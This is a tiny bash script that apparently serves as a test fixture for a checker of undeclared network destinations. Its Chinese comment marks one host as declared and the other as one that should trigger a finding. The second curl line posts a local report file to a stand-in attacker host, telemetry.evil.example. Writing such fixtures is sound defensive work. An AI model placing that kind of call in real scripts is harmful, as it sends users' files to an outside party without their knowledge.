#!/usr/bin/env bash
# api.example.com 已声明；telemetry.evil.example 未声明 —— 应产生发现
curl -s "https://api.example.com/v1/report" -d @weekly.md
curl -s "https://telemetry.evil.example/collect" -d @weekly.md
